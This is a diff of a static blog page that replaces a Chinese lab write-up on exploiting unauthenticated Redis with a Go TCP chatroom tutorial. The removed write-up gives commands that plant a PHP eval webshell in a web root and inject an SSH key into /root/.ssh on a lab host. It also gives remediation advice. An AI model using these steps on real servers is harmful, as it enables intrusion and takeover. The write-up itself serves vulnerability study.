@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="sunzy">
   <meta name="keywords" content="">
-  <title>redis - 一路走到黑</title>
+  <title>chatroom - 一路走到黑</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
@@ -177,8 +177,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-04-14 15:39" pubdate>
-        2021年4月14日 下午
+      <time datetime="2022-12-07 09:43" pubdate>
+        2022年12月7日 上午
       </time>
     </span>
   
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.2k 字
+      1.1k 字
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      13
+      15
        分钟
     </span>
   
@@ -237,108 +237,221 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto" id="post">
             <!-- SEO header -->
-            <h1 style="display: none">redis</h1>
+            <h1 style="display: none">chatroom</h1>
             
               <p class="note note-info">
                 
-                  本文最后更新于：2 年前
+                  本文最后更新于：1 分钟前
                 
               </p>
             
             <div class="markdown-body" id="post-body">
-              <h1 id="redis未授权访问漏洞复现"><a href="#redis未授权访问漏洞复现" class="headerlink" title="redis未授权访问漏洞复现"></a>redis未授权访问漏洞复现</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Redis因配置不当就会导致未授权访问。在默认情况下，Redis会绑定在 0.0.0.0:6379。如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样 Redis 服务直接暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问到目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，还可以利用 Redis 自身提供的config 命令进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p>
-<p>该漏洞的产生条件有以下两点：</p>
-<p>1.redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；<br>2.没有设置密码认证（一般为空），可以免密码(认证)远程登录redis服务。</p>
-<p>漏洞危害：<br>(1) 攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据；<br>(2) 攻击者可通过执行lua代码，或通过数据备份功能往磁盘写入后门文件；<br>(3) 最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器;</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>在kali中安装redis 3.2.0</p>
-<div class="hljs"><pre><code class="hljs awk">创建redis安装目录
-mkdir <span class="hljs-regexp">/usr/</span>local/redis
-cd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>
-wget http:<span class="hljs-regexp">//</span>download.redis.io<span class="hljs-regexp">/releases/</span>redis-<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>.tar.gz
-<span class="hljs-regexp">//</span>获取redis压缩包
-tar xzf redis-<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>.tar.gz
-cd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>redis-<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>
-make <span class="hljs-comment">#编译安装</span></code></pre></div>
+              <h1 id="GO语言实现的聊天室"><a href="#GO语言实现的聊天室" class="headerlink" title="GO语言实现的聊天室"></a>GO语言实现的聊天室</h1><p>实现很简单，基于tcp socket,做这个小项目的目的是检测对channel的理解，channel在并发场景中真的好用，但是有时候也是真挺难理解的</p>
+<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><h3 id="User"><a href="#User" class="headerlink" title="User"></a>User</h3><p>每个连接的用户需要对应一个账号，因此需要创建一个全局的struct，用户有名字，id，以及接受消息的管道</p>
+<div class="hljs"><pre><code class="hljs go"><span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> &#123;
+	<span class="hljs-comment">// 名字</span>
+	name <span class="hljs-keyword">string</span>
+	<span class="hljs-comment">// id</span>
+	id <span class="hljs-keyword">string</span>
+	<span class="hljs-comment">// msg管道</span>
+	msg <span class="hljs-keyword">chan</span> <span class="hljs-keyword">string</span>
+&#125;</code></pre></div>
 
-<p>安装完成之后需要修改配置文件，配置允许可以远程访问。</p>
-<p>vim redis.conf #修改默认配置文件</p>
-<p>在bind 127.0.0.1前面加上#号进行注释，并将protected-mode设置为no。</p>
-<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414153138387.png" srcset="/img/loading.gif" alt="image-20210414153138387"></p>
-<p>然后进入src目录，将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了），并将redis.conf拷贝到/etc/目录下。</p>
-<div class="hljs"><pre><code class="hljs awk">cd src
-cp redis-cli <span class="hljs-regexp">/usr/</span>bin
-cp redis-server <span class="hljs-regexp">/usr/</span>bin
-cp redis.conf <span class="hljs-regexp">/etc/</span></code></pre></div>
+<h3 id="map-amp-message"><a href="#map-amp-message" class="headerlink" title="map&amp;message"></a>map&amp;message</h3><p>还需要一个全局的map保存所有的用户信息，以便服务器端向所有的用户转发消息</p>
+<div class="hljs"><pre><code class="hljs go"><span class="hljs-comment">// 需要一个全局的map存储所有user信息</span>
+<span class="hljs-keyword">var</span> allUsers = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>] User)</code></pre></div>
 
-<p>开启redis服务</p>
-<div class="hljs"><pre><code class="hljs awk">redis-server <span class="hljs-regexp">/etc/</span>redis.conf</code></pre></div>
+<p>转发消息时又需要一个管道接收用户发送的消息后转发给所有用户</p>
+<div class="hljs"><pre><code class="hljs go"><span class="hljs-comment">// 需要一个全局的管道message 向所有用户发送消息</span>
+<span class="hljs-keyword">var</span> message = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">string</span>, <span class="hljs-number">10</span>)</code></pre></div>
 
-<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414153309311.png" srcset="/img/loading.gif" alt="image-20210414153309311"></p>
-<p>第一台作为攻击机即可，然后将这台主机克隆作为目标主机</p>
-<p>攻击机</p>
-<p>ip:192.168.164.145</p>
-<p>目标主机</p>
-<p>ip:192.168.164.23</p>
-<p>首先确定目标主机是否开启redis服务，使用nmap扫描端口6379</p>
-<p>如下，显示了目标使用的redis版本以及服务器的信息</p>
-<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413225839841.png" srcset="/img/loading.gif" alt="image-20210413225839841"></p>
-<p>开始利用</p>
-<h2 id="1-写入木马文件"><a href="#1-写入木马文件" class="headerlink" title="1.写入木马文件"></a>1.写入木马文件</h2><p>首先进入redis安装目录的src中执行</p>
-<div class="hljs"><pre><code class="hljs avrasm">./redis-<span class="hljs-keyword">cli</span> -h <span class="hljs-number">192.168</span><span class="hljs-number">.164</span><span class="hljs-number">.23</span></code></pre></div>
 
-<p>成功控制目标的redis服务</p>
-<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230028713.png" srcset="/img/loading.gif" alt="image-20210413230028713"></p>
-<p>向其网站根目录中写入一句话木马</p>
-<div class="hljs"><pre><code class="hljs php-template"><span class="xml">config set dir /var/www/html</span>
 
-<span class="xml">config set dbfilename shell.php</span>
+<h2 id="功能实现"><a href="#功能实现" class="headerlink" title="功能实现"></a>功能实现</h2><p>需要一个广播函数，开启该goroutine后可以一直监听message管道中的消息，然后向用户转发消息</p>
+<p>需要一个业务处理函数，当用户发送消息后，通过该函数处理</p>
+<p>需要一个消息反馈函数，将User.msg中的消息返回到客户端</p>
+<h3 id="broadcast"><a href="#broadcast" class="headerlink" title="broadcast"></a>broadcast</h3><div class="hljs"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">broadcast</span><span class="hljs-params">()</span></span>&#123;
+	fmt.Println(<span class="hljs-string">&quot;[+]:广播go协程启动成功...&quot;</span>)
+	<span class="hljs-keyword">for</span>&#123;
+		<span class="hljs-comment">// 从message中读取数据</span>
+		info := &lt;- message
+		<span class="hljs-comment">// 将消息发送给所有用户</span>
+		<span class="hljs-keyword">if</span> info != <span class="hljs-string">&quot;&quot;</span>&#123;
+			<span class="hljs-keyword">for</span> _, user := <span class="hljs-keyword">range</span> allUsers&#123;
+				user.msg &lt;- info
+			&#125;
+		&#125;
+	&#125;
+&#125;</code></pre></div>
 
-<span class="xml">set x &quot;</span><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml">&quot;</span>
+<h3 id="handler"><a href="#handler" class="headerlink" title="handler"></a>handler</h3><div class="hljs"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">handler</span><span class="hljs-params">(conn net.Conn)</span></span> &#123;
+	<span class="hljs-keyword">for</span> <span class="hljs-literal">true</span> &#123;
+		fmt.Println(<span class="hljs-string">&quot;[+]:启动业务...&quot;</span>)
+		<span class="hljs-comment">// 每次建立新连接需要创建一个user</span>
+		clientAddr := conn.RemoteAddr().String()
+		newUser := User&#123;
+			name : clientAddr,
+			id : clientAddr,
+			msg: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">string</span>),  <span class="hljs-comment">// 一定要使用make，否则没有空间写人</span>
+		&#125;
+		fmt.Println(clientAddr)
 
-<span class="xml">save </span></code></pre></div>
+		_, ok := allUsers[clientAddr]
+		<span class="hljs-keyword">if</span> !ok&#123;
+			<span class="hljs-comment">//将新创建的用户添加到map中</span>
+			allUsers[newUser.id] = newUser
+			<span class="hljs-comment">// 向广播中写入消息 通知其他人你已经上线</span>
+			loginInfo := fmt.Sprintf(<span class="hljs-string">&quot;[%s]:[%s] ====&gt; online now!&quot;</span>, newUser.name, newUser.id)
+			message &lt;- loginInfo
+			time.Sleep(time.Second)
+			<span class="hljs-keyword">go</span> writeToClient(newUser, conn)
+		&#125;
+		buf:= <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">byte</span>, <span class="hljs-number">1024</span>)
+		cnt, err := conn.Read(buf)
+		<span class="hljs-keyword">if</span> err!=<span class="hljs-literal">nil</span>&#123;
+			fmt.Println(<span class="hljs-string">&quot;conn.Read error: &quot;</span> , err)
+		&#125;
+		<span class="hljs-comment">//fmt.Println(&quot;服务器端接受的数据为：&quot;,  string(buf[:cnt]), &quot;, cnt:&quot;, cnt)</span>
+		userInfo:= fmt.Sprintf(<span class="hljs-string">&quot;[%s] say:&quot;</span>, clientAddr)
+		message &lt;- userInfo + <span class="hljs-keyword">string</span>(buf[:cnt])
+	&#125;
+&#125;</code></pre></div>
 
-<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230359912.png" srcset="/img/loading.gif" alt="image-20210413230359912"></p>
-<p>save成功后，目标主机的网站根目录就出现了木马文件</p>
-<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230408356.png" srcset="/img/loading.gif" alt="image-20210413230408356"></p>
-<p>使用蚁剑连接</p>
-<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230614612.png" srcset="/img/loading.gif" alt="image-20210413230614612"></p>
-<h2 id="2-写ssh-keygen公钥然后使用私钥进行登陆"><a href="#2-写ssh-keygen公钥然后使用私钥进行登陆" class="headerlink" title="2.写ssh-keygen公钥然后使用私钥进行登陆"></a>2.写ssh-keygen公钥然后使用私钥进行登陆</h2><p>写入ssh公钥后可以在本机存储对应的ssh密钥，然后直接无密码登陆。</p>
-<p>首先生成公钥密钥文件</p>
-<div class="hljs"><pre><code class="hljs awk">ssh-keygen -t rsa
+<h3 id="writeToClient"><a href="#writeToClient" class="headerlink" title="writeToClient"></a>writeToClient</h3><div class="hljs"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">writeToClient</span><span class="hljs-params">(user User, conn net.Conn)</span></span>&#123;
+	<span class="hljs-keyword">for</span> msg := <span class="hljs-keyword">range</span> user.msg&#123;
+		conn.Write([]<span class="hljs-keyword">byte</span>(msg + <span class="hljs-string">&quot;\n&quot;</span>))
+	&#125;
+&#125;</code></pre></div>
 
-cat <span class="hljs-regexp">/root/</span>.ssh/id_rsa.pub</code></pre></div>
 
-<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414131910830.png" srcset="/img/loading.gif" alt="image-20210414131910830"></p>
-<p>继续使用命令</p>
-<div class="hljs"><pre><code class="hljs swift">config <span class="hljs-keyword">set</span> dir <span class="hljs-operator">/</span>root<span class="hljs-operator">/</span>.ssh<span class="hljs-operator">/</span>
 
-config <span class="hljs-keyword">set</span> authorized_keys
+<p>完整程序</p>
+<div class="hljs"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main
 
-<span class="hljs-keyword">set</span> x <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>\id_rsa.pub的内容<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span>
+<span class="hljs-keyword">import</span> (
+	<span class="hljs-string">&quot;fmt&quot;</span>
+	<span class="hljs-string">&quot;net&quot;</span>
+	<span class="hljs-string">&quot;time&quot;</span>
+)
 
-save</code></pre></div>
+<span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> &#123;
+	<span class="hljs-comment">// 名字</span>
+	name <span class="hljs-keyword">string</span>
+	<span class="hljs-comment">// id</span>
+	id <span class="hljs-keyword">string</span>
+	<span class="hljs-comment">// msg管道</span>
+	msg <span class="hljs-keyword">chan</span> <span class="hljs-keyword">string</span>
+&#125;
+<span class="hljs-comment">// 需要一个全局的map存储所有user信息</span>
+<span class="hljs-keyword">var</span> allUsers = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>] User)
+<span class="hljs-comment">// 需要一个全局的管道message 向所有用户发送消息</span>
+<span class="hljs-keyword">var</span> message = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">string</span>, <span class="hljs-number">10</span>)
+<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;
+	listen, err := net.Listen(<span class="hljs-string">&quot;tcp&quot;</span>, <span class="hljs-string">&quot;:8080&quot;</span>)
+	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;
+		fmt.Println(<span class="hljs-string">&quot;net.listen err: &quot;</span>, err)
+	&#125;
+	fmt.Println(<span class="hljs-string">&quot;[+]:服务器监听成功&quot;</span>)
+	<span class="hljs-comment">// 启动全局唯一的 广播协程</span>
+	<span class="hljs-keyword">go</span> broadcast()
+	<span class="hljs-keyword">for</span>&#123;
+		accept, err := listen.Accept()
+		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;
+			fmt.Println(<span class="hljs-string">&quot;[+]:listen.accept err: &quot;</span>, err)
+		&#125;
+		fmt.Println(<span class="hljs-string">&quot;[+]:建立连接成功...&quot;</span>)
+		<span class="hljs-keyword">go</span> handler(accept)
 
-<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414131805309.png" srcset="/img/loading.gif" alt="image-20210414131805309"></p>
-<p>使用公钥连接</p>
-<div class="hljs"><pre><code class="hljs css">ssh -<span class="hljs-selector-tag">i</span> id_rsa root<span class="hljs-keyword">@192</span>.168.164.23</code></pre></div>
+	&#125;
+&#125;
 
-<p>这里的id_rsa与创建ssh密钥输入的内容一致</p>
-<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414133547275.png" srcset="/img/loading.gif" alt="image-20210414133547275"></p>
-<h2 id="3-利用计划任务反弹shell"><a href="#3-利用计划任务反弹shell" class="headerlink" title="3.利用计划任务反弹shell"></a>3.利用计划任务反弹shell</h2><p>只能在centos环境中利用因为centos环境中的计划任务文件可以忽略乱码，ubuntu环境因为无法忽略文件中的乱码因此无法使用</p>
-<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>1、限制登录ip<br>在redis.conf文件中设置redis访问的ip白名单，如果项目允许的话最好设置为只允许本地访问。</p>
-<p>2、添加密码<br>在redis.conf配置文件中找到requirepass并去掉前面的#， 然后在后面设置一个高强度的密码。因为redis验证密码的速度很快，给攻击者进行高速的爆破密码提供了一个良好的基础，所以设置一个高强度的密码不仅解决了未授权的问题还能防止密码爆破。</p>
-<p>3、修改默认端口</p>
+<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">handler</span><span class="hljs-params">(conn net.Conn)</span></span> &#123;
+	<span class="hljs-keyword">for</span> <span class="hljs-literal">true</span> &#123;
+		fmt.Println(<span class="hljs-string">&quot;[+]:启动业务...&quot;</span>)
+		<span class="hljs-comment">// 每次建立新连接需要创建一个user</span>
+		clientAddr := conn.RemoteAddr().String()
+		newUser := User&#123;
+			name : clientAddr,
+			id : clientAddr,
+			msg: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">string</span>),  <span class="hljs-comment">// 一定要使用make，否则没有空间写人</span>
+		&#125;
+		fmt.Println(clientAddr)
+
+		_, ok := allUsers[clientAddr]
+		<span class="hljs-keyword">if</span> !ok&#123;
+			<span class="hljs-comment">//将新创建的用户添加到map中</span>
+			allUsers[newUser.id] = newUser
+			<span class="hljs-comment">// 向广播中写入消息 通知其他人你已经上线</span>
+			loginInfo := fmt.Sprintf(<span class="hljs-string">&quot;[%s]:[%s] ====&gt; online now!&quot;</span>, newUser.name, newUser.id)
+			message &lt;- loginInfo
+			time.Sleep(time.Second)
+			<span class="hljs-keyword">go</span> writeToClient(newUser, conn)
+		&#125;
+		buf:= <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">byte</span>, <span class="hljs-number">1024</span>)
+		cnt, err := conn.Read(buf)
+		<span class="hljs-keyword">if</span> err!=<span class="hljs-literal">nil</span>&#123;
+			fmt.Println(<span class="hljs-string">&quot;conn.Read error: &quot;</span> , err)
+		&#125;
+		<span class="hljs-comment">//fmt.Println(&quot;服务器端接受的数据为：&quot;,  string(buf[:cnt]), &quot;, cnt:&quot;, cnt)</span>
+		userInfo:= fmt.Sprintf(<span class="hljs-string">&quot;[%s] say:&quot;</span>, clientAddr)
+		message &lt;- userInfo + <span class="hljs-keyword">string</span>(buf[:cnt])
+	&#125;
+&#125;
+
+<span class="hljs-comment">// 向所有用户广播消息， 全局唯一</span>
+<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">broadcast</span><span class="hljs-params">()</span></span>&#123;
+	fmt.Println(<span class="hljs-string">&quot;[+]:广播go协程启动成功...&quot;</span>)
+	<span class="hljs-keyword">for</span>&#123;
+		<span class="hljs-comment">// 从message中读取数据</span>
+		info := &lt;- message
+		<span class="hljs-comment">// 将消息发送给所有用户</span>
+		<span class="hljs-keyword">if</span> info != <span class="hljs-string">&quot;&quot;</span>&#123;
+			<span class="hljs-keyword">for</span> _, user := <span class="hljs-keyword">range</span> allUsers&#123;
+				user.msg &lt;- info
+			&#125;
+		&#125;
+	&#125;
+&#125;
+
+<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">writeToClient</span><span class="hljs-params">(user User, conn net.Conn)</span></span>&#123;
+	<span class="hljs-keyword">for</span> msg := <span class="hljs-keyword">range</span> user.msg&#123;
+		conn.Write([]<span class="hljs-keyword">byte</span>(msg + <span class="hljs-string">&quot;\n&quot;</span>))
+	&#125;
+&#125;
+
+</code></pre></div>
+
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>用户一</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207103317397.png" srcset="/img/loading.gif" alt="image-20221207103317397"></p>
+<p>用户二</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207103251004.png" srcset="/img/loading.gif" alt="image-20221207103251004"></p>
+<p>用户三</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207103427557.png" srcset="/img/loading.gif" alt="image-20221207103427557"></p>
+<p>控制台消息</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207103500122.png" srcset="/img/loading.gif" alt></p>
+<p>后续再对聊天室进一步优化</p>
 
             </div>
             <hr>
             <div>
               <div class="post-metas mb-3">
                 
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/go/">go</a>
+                    
+                  </div>
+                
                 
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a>
+                      <a class="hover-with-bg" href="/tags/go/">go</a>
+                    
+                      <a class="hover-with-bg" href="/tags/tcp/">tcp</a>
+                    
+                      <a class="hover-with-bg" href="/tags/socket/">socket</a>
                     
                   </div>
                 
@@ -351,18 +464,12 @@ save</code></pre></div>
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/05/02/spiderofwords/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">spiderofwords</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/03/31/scrapy/">
-                        <span class="hidden-mobile">scrapy</span>
+                      <a href="/2022/09/30/vulnhub/">
+                        <span class="hidden-mobile">vulnhub</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -565,7 +672,7 @@ save</code></pre></div>
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "redis&nbsp;",
+        "chatroom&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
